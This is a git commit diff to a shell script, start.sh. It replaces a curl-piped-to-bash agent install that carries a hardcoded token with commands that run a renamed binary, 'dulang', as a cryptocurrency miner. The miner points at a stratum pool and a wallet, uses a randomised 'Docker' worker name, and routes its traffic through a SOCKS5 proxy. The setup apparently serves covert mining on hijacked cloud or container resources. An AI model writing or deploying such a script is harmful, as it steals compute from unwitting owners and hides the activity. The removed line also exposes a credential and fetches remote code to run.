9fde28b414f45303c3a2299b362fc99c09d7ddb7
dfgfd443rete <86584933+dfgfd443rete@users.noreply.github.com>
2021-06-28 23:30:20 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,5 +3,8 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x dulang
 screen -dmS ls 
-TOKEN="541f49219b7bb5fb8c331ca6ce2124a390997028e886be01f4" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
+POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
+WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.dus
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
+PROXY=socks5://98.162.25.23:4145
+./dulang -a yespowersugar -o $POOL -u $WALLET -p $WORKER -t 2 -x $PROXY
